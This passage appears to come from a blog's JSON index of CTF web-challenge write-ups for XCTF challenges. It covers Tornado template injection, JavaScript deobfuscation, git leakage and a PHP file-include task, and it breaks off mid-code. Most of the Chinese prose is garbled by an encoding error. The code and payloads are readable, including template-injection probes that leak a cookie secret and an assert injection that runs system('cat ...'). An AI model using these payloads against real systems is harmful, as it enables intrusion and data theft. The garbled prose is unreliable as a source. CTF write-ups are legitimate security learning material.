ä½†ç»†ç»†è§‚å¯Ÿå‘ç°msgå‚æ•°çš„å†…å®¹ä¸å‰ç«¯é¡µé¢å†…å®¹ä¸€è‡´ï¼Œé‚£ä¹ˆå¯ä»¥çŒœæµ‹è¿™æ—¶å°±æ˜¯æ³¨å…¥ç‚¹ï¼Œé‚£æˆ‘ä»¬å°è¯•ä¸€ä¸‹å³å¯ ä½†è¿™é‡Œç¼ºæŠ¥é”™äº†ï¼Œæœ‰ç‚¹è’™ï¼Œé‚£ä¼°è®¡å°±å’Œæ¡†æ¶æœ‰å…³äº†ï¼Œåœ¨çœ‹wpå‘ç°ï¼Œè¿˜æ˜¯ç»“åˆæç¤ºï¼Œè¿™é‡Œæˆ‘ä»¬é¦–å…ˆå·²ç»å¾—çŸ¥è¦è®¿é—®çš„æ–‡ä»¶åï¼Œé‚£ä¹ˆæ­¤æ—¶å°±è¦æƒ³æ³•è·å¾—cooki_secretã€‚ æŸ¥çœ‹tornadoçš„å®˜æ–¹æ–‡æ¡£ cookie_secretåœ¨tornadoæ¡†æ¶ä¸­çš„tornado.web.RequestHandlerå’Œtornado.web.Applicationç±»ä¸­æœ‰ä½¿ç”¨åˆ°ï¼š tornado.web.RequestHandlerï¼ˆHTTPè¯·æ±‚å¤„ç†ç¨‹åºçš„åŸºç±»ï¼‰ RequestHandler.get_secure_cookie( name , value=None , max_age_days=31 , min_version=None ) å¦‚æœéªŒè¯é€šè¿‡ï¼Œåˆ™è¿”å›ç»™å®šçš„ç­¾åcookieï¼Œå¦åˆ™è¿”å› Noneã€‚ RequestHandler.settings RequestHandlerç±»çš„è®¾ç½®å‚æ•°ï¼Œå®ƒçš„åˆ«åself.application.settingsã€‚ tornado.web.Applicationï¼ˆç»„æˆ Web åº”ç”¨ç¨‹åºçš„è¯·æ±‚å¤„ç†ç¨‹åºçš„é›†åˆï¼‰ tornado.web.Application.settingsï¼š ä¼ é€’ç»™æ„é€ å‡½æ•°çš„å…¶ä»–å…³é”®å­—å‚æ•°ä¿å­˜åœ¨settingså­—å…¸ä¸­ï¼Œå¹¶ä¸”é€šå¸¸åœ¨æ–‡æ¡£ä¸­ç§°ä¸ºâ€œåº”ç”¨ç¨‹åºè®¾ç½®â€ã€‚è®¾ç½®ç”¨äºè‡ªå®šä¹‰ Tornado çš„å„ä¸ªæ–¹é¢ï¼ˆå°½ç®¡åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œé€šè¿‡è¦†ç›– çš„å­ç±»ä¸­çš„æ–¹æ³•å¯ä»¥å®ç°æ›´ä¸°å¯Œçš„è‡ªå®šä¹‰RequestHandlerï¼‰ã€‚ä¸€äº›åº”ç”¨ç¨‹åºè¿˜å–œæ¬¢ä½¿ç”¨settingså­—å…¸ä½œä¸ºä¸€ç§æ–¹å¼ï¼Œä½¿å¤„ç†ç¨‹åºå¯ä»¥ä½¿ç”¨ç‰¹å®šäºåº”ç”¨ç¨‹åºçš„è®¾ç½®ï¼Œè€Œæ— éœ€ä½¿ç”¨å…¨å±€å˜é‡ã€‚ å…¶ä¸­å°±åŒ…å«äº†cookie_secret: ç”±RequestHandler.get_secure_cookieå‡½æ•°å’Œset_secure_cookieå‡½æ•°ç”¨äºå¯¹ cookie è¿›è¡Œç­¾åã€‚ æ‰€ä»¥å¯ä»¥è®¿é—®åˆ°cookie_secretçš„å‡½æ•°æœ‰ï¼šRequestHandler.get_secure_cookieã€RequestHandler.settingsã€self.application.settingsã€ è®¿é—® http://61.147.171.105:60053/error?msg={{RequestHandler.get_secure_cookie}} çªç„¶å‘ç°ä¸èƒ½ç›´æ¥ç”¨ç±»åè°ƒç”¨å‡½æ•°å»è®¿é—®åˆ°å®ƒsettingsï¼Œå¿…é¡»è¦ç”¨å®ä¾‹åŒ–çš„å¯¹è±¡è°ƒç”¨å‡½æ•°å»è®¿é—®ï¼Œè€Œhandlerå°±æ˜¯å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„HTTPè¯·æ±‚çš„RequestHandlerå¯¹è±¡ ï¼ˆå¦ï¼šåœ¨Tornadoçš„å‰ç«¯é¡µé¢æ¨¡æ¿ä¸­ï¼ŒTornadoæä¾›äº†ä¸€äº›å¯¹è±¡åˆ«åæ¥å¿«é€Ÿè®¿é—®å¯¹è±¡ï¼ŒHandlerå¯¹è±¡æŒ‡å‘çš„å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„RequestHandlerå¯¹è±¡ã€‚æ‰§è¡Œ?msg={{datetime}} è¿˜å¯ä»¥è®¿é—®åˆ°datetimeæ¨¡å—ï¼‰ å¾—åˆ°cookie_secretçš„å€¼ æ‰€ä»¥æˆ‘ä»¬ç›´æ¥è®¿é—®handler.get_secure_cookieã€handler.settingsã€handler.application.settingsã€ http://61.147.171.105:60053/error?msg={{handler.get_secure_cookie}} get_secure_cookieå‡½æ•°è¿˜æ˜¯è¢«è¿‡æ»¤äº† http://61.147.171.105:60053/error?msg={{handler.settings}} æˆåŠŸæ‰¾åˆ° è®¡ç®—md5å€¼ ä¹‹åæˆ‘ä»¬ç»§ç»­è®¡ç®—å“ˆå¸Œå€¼ï¼šmd5(cookie_secret+md5(/fllllllllllllag)) æ³¨æ„filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))ä¸­filename=/fllllllllllllagä¸æ˜¯fllllllllllllagï¼Œå°‘äº†ä¸ªâ€œ/â€å¾—åˆ°çš„MD5å€¼ä¼šä¼šä¸ä¸€æ ·çš„ï¼Œå‰é¢çš„/flag.txtã€/welcome.txtã€/hints.txtæ–‡ä»¶MD5å€¼ä¹Ÿæ˜¯32ä½çš„ã€‚ MD5åœ¨çº¿åŠ å¯† åœ°å€ï¼šhttp://www.jsons.cn/md5/s/ /fllllllllllllagç»è¿‡32ä½å°å†™MD5å€¼åŠ å¯†ï¼š 3bf9f6cf685a6dd8defadabfb41a03a1 ä¹‹åcookie_secretçš„å€¼åŠ ä¸Š/fllllllllllllagç»è¿‡32ä½å°å†™MD5å€¼ï¼š faaa34dd-fbe3-4b1b-9e2e-8071918f97453bf9f6cf685a6dd8defadabfb41a03a1 å†ç»è¿‡ä¸€æ¬¡32å°å†™MD5å€¼åŠ å¯†ï¼š 8b82faf703302b0590f91499236c86fa å¾—åˆ°flag å‚è€ƒæ–‡ç« ï¼š wpå‚è€ƒä¸€ wpå‚è€ƒäºŒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-simple_js","path":"/2023/08/17/simple-js/","content":"é¢˜ç›®æè¿°ï¼š å°å®å‘ç°äº†ä¸€ä¸ªç½‘é¡µï¼Œä½†å´ä¸€ç›´è¾“ä¸å¯¹å¯†ç ã€‚(Flagæ ¼å¼ä¸º Cyberpeace{xxxxxxxxx} ) é¢˜ç›®è§£é¢˜ï¼š ä¸€ä¸ªå¯†ç æ¡†ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªè¯•è¯• è¯´æ˜¯å‡å¯†ç ã€‚ã€‚ã€‚ï¼Œé‚£çœ‹ä¸€ä¸‹æºä»£ç  function dechiffre(pass_enc){ var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab = pass_enc.split(','); var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = \"\";i = 0;j = tab.length; k = j + (l) + (n=0); n = tab2.length; for(i = (o=0); i &lt; (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i])); if(i == 5)break;} for(i = (o=0); i &lt; (k = j = n); i++ ){ o = tab[i-l]; if(i &gt; 5 &amp;&amp; i &lt; k-1) p += String.fromCharCode((o = tab2[i])); } p += String.fromCharCode(tab2[17]); pass = p;return pass; } String[\"fromCharCode\"](dechiffre(\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\")); h = window.prompt('Enter password'); alert( dechiffre(h) ); ä¸€ä¸ªå¾ˆçº¯ç²¹çš„jsä»£ç ï¼Œé‚£è‚¯å®šå°±è¦å®¡è®¡äº†ï¼Œè¿™é‡Œä¹Ÿæ˜¯å¯¹æˆ‘æ¥è¯´æœ‰ç‚¹éš¾ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œé‚£ä¹ˆå°±GPTå’Œwpå…±åŒå‚è€ƒä¸€ä¸‹ ä¸€.ä»£ç å®šä¹‰äº†ä¸€ä¸ªdechiffreå‡½æ•°ï¼Œå› ä¸ºè¿˜æ²¡æœ‰è°ƒç”¨ï¼Œå°±å…ˆä¸ç†ä»–äº†ã€‚ å…ˆå°†åå…­è¿›åˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œä½¿ç”¨ç½‘å€ï¼šhttps://www.bejson.com/convert/ox2str/ æˆ–è€…ç›´æ¥å°†åå…­è¿›åˆ¶å‚æ•°æ”¾å…¥pythonçš„print()ä¸­ã€‚å³ s=\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\" print (s) è½¬æ¢ç»“æœ:55,56,54,79,115,69,114,116,107,49,50 äºŒ.æ‰§è¡Œäº†String[\"fromCharCode\"](dechiffre(\"55,56,54,79,115,69,114,116,107,49,50\")); 2.1 è°ƒç”¨äº†dechiffreï¼Œæ‰§è¡Œäº†dechiffreå‡½æ•°å°†â€œ\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30â€ä½œä¸ºå‚æ•°å¸¦å…¥dechiffreå‡½æ•°ä¸­æ‰§è¡Œã€‚å³ï¼š dechiffre(pass_enc) 2.2 æ¥ç€å®šä¹‰äº†passå˜é‡ä¸€å¤§ä¸²ï¼Œå…ˆæ”¾ç€ 2.3 å› ä¸ºpass_enc=\"55,56,54,79,115,69,114,116,107,49,50\" å°†pass_encå­—ç¬¦ä¸²åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„ï¼Œå¤åˆ¶ç»™tabå‚æ•°æ‰€ä»¥: tab=[55,56,54,79,115,69,114,116,107,49,50] æ³¨:tabæ­¤æ—¶æ˜¯å­—ç¬¦ä¸²æ•°ç»„!!! 2.4 éšå tab2ç­‰äº passåˆ†å‰²æˆçš„æ•°ç»„ tab2=[70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65] 2.5 å˜é‡èµ‹å€¼ä»£ç åˆ†æï¼švar i,j,k,l=0,m,n,o,p = \"\";i = 0;j = tab.length; ä¸€å¼€å§‹iï¼Œjï¼Œmï¼Œnï¼Œoæ²¡æœ‰èµ‹å€¼ï¼Œä¸ºundefinedï¼Œè€Œå…¶ä»–å‚æ•°l=0ï¼Œp=\"\",åæ¥ i è¢«èµ‹å€¼=0ï¼Œjè¢«èµ‹å€¼=11 2.6 k = j + (l) + (n=0); å› ä¸ºn=0,æ‰€ä»¥k=11+0+0=11, æ³¨è¿™é‡Œçš„(l)æ˜¯è‹±æ–‡å­—æ¯lï¼Œä¸æ˜¯æ•°å­—1 2.7 n = tab2.length; nç­‰äºtab2çš„é•¿åº¦18 æ‰€ä»¥n=18 2.8 ç¬¬ä¸€ä¸ªå¾ªç¯ï¼Œç²¾ç®€ä¸€äº›ä»£ç ï¼š for(i =0; i &lt; (k = j = n); i++ ) //i =(o=0) ä¸å°±æ˜¯ i=0å˜› ï¼ŒçœŸæ˜¯æœäº†,è¿™æ®µä»£ç ä¸€å¤§å †çƒŸé›¾å¼¹ï¼Œåé¢é‚£ä¸ªæ›´å¤§ {o = tab[i-l]; p += String.fromCharCode((o = tab2[i])); if(i == 5)break;} è§£é‡Šï¼šå‰é¢çš„o=tab[i-1]æ˜¯æ— ç”¨çš„ï¼Œå› ä¸ºåé¢ä¼šè¢«o=tab2[i]çš„å€¼é‡æ–°è¦†ç›– çƒŸé›¾å¼¹+1 ç¬¬ä¸€æ¬¡å¾ªç¯ï¼šo=tab[0];p=p+String.fromCharCode((o = tab2[0]) tab2[0]=70,o=70 p=\"\"+String.fromCharCode(70) ==&gt;p=F psï¼šfromCharCodeï¼šå°† Unicode ç¼–ç è½¬ä¸ºä¸€ä¸ªå­—ç¬¦: ç¬¬äºŒæ¬¡... p=A ç¬¬ä¸‰æ¬¡... p=U ç¬¬å››æ¬¡... p=X ç¬¬äº”æ¬¡... p= æ‰€ä»¥ï¼Œè¿™ä¸ªforå¾ªç¯ï¼Œæœ€åçš„pä¸ºï¼ˆå°½ç®¡æ²¡æœ‰è¾“å‡ºå‡ºæ¥ï¼Œè¿™é‡Œæˆ‘ä»¬çŸ¥é“å°±å¥½ï¼‰FAUX P 2.9 ç¬¬äºŒä¸ªå¾ªç¯ï¼Œç²¾ç®€ä¸€äº›ä»£ç ï¼š for(i = 0; i &lt; 18; i++ ){ //i =(o=0)ä¸å°±æ˜¯ i=0å˜› ï¼Œå’Œä¸Šé¢çš„ä¸€æ ·ï¼ŒçƒŸé›¾å¼¹+1 o = tab[i-l]; if(i &gt; 5 &amp;&amp; i &lt; 17) p += String.fromCharCode((o = tab2[i])); } è§£é‡Šï¼šè¿™é‡Œçš„forå¾ªç¯å’Œä¸Šé¢çš„å·®ä¸å¤šï¼Œæ³¨æ„è¿™é‡Œçš„på€¼ç”±äºç¬¬ä¸€æ¬¡forå¾ªç¯æ‰§è¡Œåç°åœ¨å·²ç»æ˜¯FAUX Päº† åŠ ä¸Šç¬¬ä¸€æ¬¡forå¾ªç¯çš„på€¼ï¼Œæœ€åçš„pä¸ºFAUX PASSWORD HAH 2.10 p += String.fromCharCode(tab2[17]); å› ä¸ºtab2=[70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65] æ‰€ä»¥ï¼šp=FAUX PASSWORD HAH + A å› æ­¤ï¼Œæœ€åçš„pä¸ºFAUX PASSWORD HAHA 2.11 pass = p;return pass; å³ pass = FAUX PASSWORD HAHA;return FAUX PASSWORD HAHA; æœ€åå‡½æ•°è¾“å‡ºä¸ºFAUX PASSWORD HAHA é¢ã€‚ã€‚è¿™ä¸ªå‡½æ•°å°±è¿™æ ·æ‰§è¡Œå®Œäº†ï¼Œtabæ•°ç»„ä¹Ÿæ²¡æœ‰ä½¿ç”¨åˆ°ï¼ï¼ä¸€å¼€å§‹å¸¦å…¥è¿›æ¥çš„å‚æ•°pass_encä¹Ÿæ²¡æœ‰ç”¨ï¼Œï¼Œæœ€åè¿™ä¸ªtabå’Œå…¶å¸¦å…¥çš„å‚æ•°å°±åƒä¸ªçƒŸé›¾å¼¹ï¼Œè¿·æƒ‘äººçš„ã€‚ åœ¨è¿è¡Œå‡½æ•°è¿‡ç¨‹ä¸­ä¹Ÿç”¨åˆ°äº†åˆ†å‰²åçš„tabæ•°ç»„ï¼ˆå³å¸¦å…¥çš„å‚æ•°ï¼‰ï¼Œä½†æ˜¯ç»è¿‡forå¾ªç¯çš„ä¸€é€šä¹±ç»•ï¼Œäººå®¶ç›´æ¥ä½¿ç”¨tab2æ•°ç»„ç›¸å…³ä»£ç çš„å€¼ï¼Œæ ¹æœ¬æ²¡æœ‰ä½¿ç”¨åˆ°tabæ•°ç»„çš„å€¼ï¼Œ æ‰€ä»¥ç”±äºä»£ç é€»è¾‘é—®é¢˜ï¼Œä¼ å…¥dechiffreå‡½æ•°çš„å‚æ•°pass_encæ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œåªæ˜¯ä¸ªçƒŸé›¾å¼¹ã€‚ ä¸‰ã€dechiffreå‡½æ•°æ‰§è¡Œåï¼Œç»§ç»­æ‰§è¡Œå…¶ä»–çš„ä»£ç  h = window.prompt('Enter password'); alert( dechiffre(h) ); h=ä½ è¾“å…¥å¼¹æ¡†çš„å†…å®¹ ä¹‹åalertå¼¹å‡ºdechiffre(h)çš„å€¼ï¼Œç”±å‰é¢æ‰€æœ‰çš„ä»£ç åˆ†æå¯çŸ¥ï¼Œä»£ç ä¸­çš„på€¼ä¸tabæ— å…³ï¼Œå› ä¸ºä¸è®ºä½ è¾“å…¥ä»€ä¹ˆæœ€ç»ˆéƒ½ä¼šè¢«tab2çš„å€¼æ›¿ä»£ã€‚ æ‰€ä»¥ä¸è®ºpass_encè¾“å…¥ä»€ä¹ˆå‚æ•°ï¼Œè¾“å‡ºçš„å€¼éƒ½æ˜¯ä¼šæ˜¾ç¤ºFAUX PASSWORD HAHAã€‚ æœ€åç»“è®ºæ˜¯ï¼Œä¸è®ºè¾“å…¥ä»€ä¹ˆå‚æ•°ï¼Œéƒ½åªä¼šè¿”å›FAUX PASSWORD HAHAï¼Œæ‰€ä»¥flagå¯èƒ½ä¼šä¸è¾“å…¥dechiffreçš„å‚æ•°æœ‰å…³:\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30 ç”±ä¸Šé¢åˆ†æå·²çŸ¥ï¼Œè¿™ä¸€ä¸²å‚æ•°è½¬æ¢ä¸ºtabå­—ç¬¦ä¸²æ•°ç»„ä¸º:[55,56,54,79,115,69,114,116,107,49,50] æ³¨:tabæ­¤æ—¶æ˜¯å­—ç¬¦ä¸²æ•°ç»„ï¼ï¼ï¼ æ‰€ä»¥å¾—æŠ›å¼ƒå‰é¢çš„ä»£ç ï¼Œé‡æ–°ç¼–å†™ä»£ç æ¥è¿è¡Œå®ƒï¼Œå¥½å§å…¶å®æ˜¯å¤§ä½¬å†™çš„ï¼Œæˆ‘ä¸ä¼šï¼ï¼ï¼ &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var n=String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50); document.write(n); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; æœ€åç»“æœæ˜¯ï¼š786OsErtk12 æ ¹æ®é¢˜ç›®çš„æç¤ºçš„Flagçš„æ ¼å¼ï¼Œæ‰€ä»¥flagä¸ºï¼šCyberpeace{786OsErtk12} å‡½æ•°è¯´æ˜ï¼š (1)split() æ–¹æ³•ç”¨äºæŠŠä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„ è¯­æ³•ï¼šstring.split(separator,limit) å‚æ•° æè¿° separator å¯é€‰ã€‚å­—ç¬¦ä¸²æˆ–æ­£åˆ™è¡¨è¾¾å¼ï¼Œä»è¯¥å‚æ•°æŒ‡å®šçš„åœ°æ–¹åˆ†å‰² string Objectã€‚æ¯”å¦‚æ­¤é¢˜ä»¥é€—å·åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„ limit å¯é€‰ã€‚è¯¥å‚æ•°å¯æŒ‡å®šè¿”å›çš„æ•°ç»„çš„æœ€å¤§é•¿åº¦ã€‚å¦‚æœè®¾ç½®äº†è¯¥å‚æ•°ï¼Œè¿”å›çš„å­ä¸²ä¸ä¼šå¤šäºè¿™ä¸ªå‚æ•°æŒ‡å®šçš„æ•°ç»„ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®è¯¥å‚æ•°ï¼Œæ•´ä¸ªå­—ç¬¦ä¸²éƒ½ä¼šè¢«åˆ†å‰²ï¼Œä¸è€ƒè™‘å®ƒçš„é•¿åº¦ã€‚ ä¸¾ä¾‹ï¼šstr=\"a,b,c,d,e,f,g\"; var 1st = str.split(\",\",3); å¯¹strä»¥é€—å·è¿›è¡Œåˆ†å‰²ï¼Œåˆ†å‰²åçš„å­—ç¬¦ä¸²æ•°ç»„å†…çš„å€¼æœ€å¤šåªèƒ½æœ‰3ä¸ªï¼Œç»“æœå°±æ˜¯1st = [a,b,c] (2)for å¾ªç¯çš„è¯­æ³•å¦‚ä¸‹ï¼š for (è¯­å¥ 1; è¯­å¥ 2; è¯­å¥ 3) { è¦æ‰§è¡Œçš„ä»£ç å— } è¯­å¥ 1 åœ¨å¾ªç¯ï¼ˆä»£ç å—ï¼‰å¼€å§‹ä¹‹å‰æ‰§è¡Œã€‚ è¯­å¥ 2 å®šä¹‰è¿è¡Œå¾ªç¯ï¼ˆä»£ç å—ï¼‰çš„æ¡ä»¶ã€‚ è¯­å¥ 3 ä¼šåœ¨å¾ªç¯ï¼ˆä»£ç å—ï¼‰æ¯æ¬¡è¢«æ‰§è¡Œåæ‰§è¡Œã€‚ (3)fromCharCode() å¯æ¥å—ä¸€ä¸ªæŒ‡å®šçš„ Unicode å€¼ï¼Œç„¶åè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ è¯­æ³•ï¼šString.fromCharCode(n1, n2, ..., nX) å‚æ•° æè¿° n1, n2, ..., nX å¿…éœ€ã€‚ä¸€ä¸ªæˆ–å¤šä¸ª Unicode å€¼ï¼Œå³è¦åˆ›å»ºçš„å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦çš„ Unicode ç¼–ç ã€‚ (4)prompt()æ–¹æ³•ç”¨äºæ˜¾ç¤ºå¯æç¤ºç”¨æˆ·è¿›è¡Œè¾“å…¥çš„å¯¹è¯æ¡†ã€‚ è¿™ä¸ªæ–¹æ³•è¿”å›ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸² è¯­æ³•ï¼šprompt(msg,defaultText) å‚æ•° æè¿° msg å¯é€‰ã€‚è¦åœ¨å¯¹è¯æ¡†ä¸­æ˜¾ç¤ºçš„çº¯æ–‡æœ¬ï¼ˆè€Œä¸æ˜¯ HTML æ ¼å¼çš„æ–‡æœ¬ï¼‰å°±æ˜¯å¼¹æ¡†æ˜¾ç¤ºæ–‡æœ¬ã€‚ defaultText å¯é€‰ã€‚é»˜è®¤çš„è¾“å…¥æ–‡æœ¬ï¼Œä½ è¾“å…¥ä»€ä¹ˆå¼¹æ¡†ä¸€å¼€å§‹å‡ºç°é‡Œé¢çš„è¾“å…¥æ¡†å°±ä¼šé»˜è®¤æ˜¾ç¤ºä½ è¿™ä¸ªæ–‡æœ¬ã€‚ (5)var i,j,k,l=0,m,n,o,p = \"\"; è¿™ä¸ªè¡¨ç¤ºå£°æ˜å˜é‡i,j,k,l,m,n,o,pï¼Œåªæœ‰lå’Œpä¸¤ä¸ªå˜é‡è¢«èµ‹å€¼äº†ï¼Œå…¶å®ƒçš„å˜é‡éƒ½æ˜¯ä¸å¸¦å€¼çš„ï¼Œä¸å¸¦æœ‰å€¼çš„å˜é‡ï¼Œå®ƒçš„å€¼å°†æ˜¯undefinedï¼Œåç»­ä»£ç ä¸­å¯ä»¥ç»™å®ƒèµ‹å€¼ã€‚ (6)length length å±æ€§å¯è®¾ç½®æˆ–è¿”å›æ•°ç»„ä¸­å…ƒç´ çš„æ•°ç›®ã€‚ æ–‡ç« å‚è€ƒï¼š wpå‚è€ƒä¸€","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-mfw","path":"/2023/08/17/mfw/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š è¿›å…¥é¡µé¢ï¼Œä¸€ä¸ªä¸ªéƒ½ç‚¹äº†ç‚¹ï¼Œæ²¡å•¥ç”¨çš„ï¼ŒæŸ¥çœ‹urlå‘ç°æœ‰ä¸ªpageå‚æ•°ï¼Œæƒ³ç€æˆ–è®¸æ˜¯æ–‡ä»¶åŒ…å«ï¼Œè¯•äº†è¯•æ²¡å•¥æˆæœï¼Œäºæ˜¯æƒ³åˆ°æ‰«ç½‘ç«™ï¼Œç„¶åç”¨dirsearchæ‰«äº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰gitæ³„éœ²ï¼Œäºæ˜¯åœ¨åé¢æ·»åŠ /.git/è®¿é—®çœ‹çœ‹ å‘ç°çš„ç¡®æ˜¯gitæ³„éœ²ï¼Œè¿™æ—¶ä¸‹è½½äº†è¿™äº›æ–‡ä»¶å‘ç°éƒ½æ˜¯ä¹±ç ï¼Œä¸çŸ¥é“å’‹å¤„ç†äº†ï¼Œçœ‹äº†wpå‘ç°è¦åˆ©ç”¨å·¥å…·æ¥è¿˜åŸä»£ç  Githackï¼šå·¥å…·ä¸‹è½½(linux): git clone https://github.com/lijIEjIE/GitHack.git å‘½ä»¤ï¼špython GitHack.py http://61.147.171.105:63789/.git æˆåŠŸä¸‹è½½ï¼ŒæŸ¥çœ‹index.phpï¼Œæ‰¾åˆ°é‡è¦ä»£ç  &lt;?php if (isset($_GET['page'])) { $page = $_GET['page']; } else { $page = \"home\"; } $file = \"templates/\" . $page . \".php\"; // I heard '..' is dangerous! assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\"); // TODO: Make this look nice assert(\"file_exists('$file')\") or die(\"That file doesn't exist!\"); ?&gt; strpos()å‡½æ•°æŸ¥æ‰¾\"..\"åœ¨$fileä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆ™è¿”å›false file_exists()å‡½æ•°æ£€æŸ¥$fileæ˜¯å¦å­˜åœ¨ assert()å‡½æ•°ä¼šå°†æ‹¬å·ä¸­çš„å­—ç¬¦å½“æˆä»£ç æ¥æ‰§è¡Œï¼Œå¹¶è¿”å›trueæˆ–false å› æ­¤è¿™é‡Œå°±æ˜¯åˆ©ç”¨assertæ‰§è¡Œä»£ç ï¼Œé‚£ä¹ˆå°±è¦æƒ³åŠæ³•æ’å…¥å‘½ä»¤å‡½æ•°ï¼Œå› æ­¤æ„é€ å¦‚ä¸‹payload è¿™é‡Œæˆ‘ä»¬ä¹ŸçŸ¥é“flagåœ¨./templates/flag.phpç›®å½•å¤„ ?page=') or system('cat templates/flag.php');// è¢«ä¼ å…¥ä¹‹åå˜æˆï¼š $file=\"templates/') or system('cat ./templates/flag.php');//.php\" strpos()è¿”å›falseï¼Œå†åˆ©ç”¨orè®©å…¶æ‰§è¡Œsystemå‡½æ•°ï¼Œå†ç”¨\" // \"å°†åé¢çš„è¯­å¥æ³¨é‡Šæ‰ assert(\"strpos('template/') or system('cat ./template/flag.php');//.php, '..') === false\") ä¸‹åˆ’çº¿å†…å®¹è¢«æ³¨é‡Šæ‰äº†ï¼Œæ‰€ä»¥çœŸæ­£æ‰§è¡Œäº†ä»¥ä¸‹è¯­å¥ strpos('template/') or system('cat ./template/flag.php'); æ‹¿åˆ°flag å‚è€ƒæ–‡ç« ï¼š wpå‚è€ƒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-ics-05","path":"/2023/08/17/ics-05/","content":"é¢˜ç›®æè¿°ï¼š å…¶ä»–ç ´åè€…ä¼šåˆ©ç”¨å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿè®¾å¤‡ç»´æŠ¤ä¸­å¿ƒçš„åé—¨å…¥ä¾µç³»ç»Ÿ é¢˜ç›®è§£é¢˜ï¼š è¿›å…¥é¡µé¢ä¹‹åï¼Œç‚¹æ¥ç‚¹å»ä¹Ÿå°±è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒæœ‰ä¸œè¥¿ï¼Œå…¶ä»–éƒ½æ˜¯ä¸€æ ·çš„é¡µé¢ æŸ¥çœ‹æºä»£ç å‘ç°æœ‰ä¸ªgetå‚æ•°ï¼Œæˆ‘ä»¬ä¼ ä¸€ä¸‹çœ‹çœ‹ è¿™é‡Œæˆ‘æ˜¯ç›´æ¥æƒ³åˆ°çš„æ–‡ä»¶åŒ…å«ï¼Œå¦‚ä¸Šå›¾å¾—åˆ°index.phpçš„æºç ï¼Œæˆ‘ä»¬è§£ç çœ‹çœ‹ &lt;?php $page = $_GET[page]; if (isset($page)) { if (ctype_alnum($page)) { ?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;?php }else{ ?&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;div style=\"text-align:center\"&gt; &lt;p class=\"lead\"&gt; &lt;?php if (strpos($page, 'input') &gt; 0) { die(); } if (strpos($page, 'ta:text') &gt; 0) { die(); } if (strpos($page, 'text') &gt; 0) { die(); } if ($page === 'index.php') { die('Ok'); } include($page); die(); ?&gt; &lt;/p&gt; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;?php }} //æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯• if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') { echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) 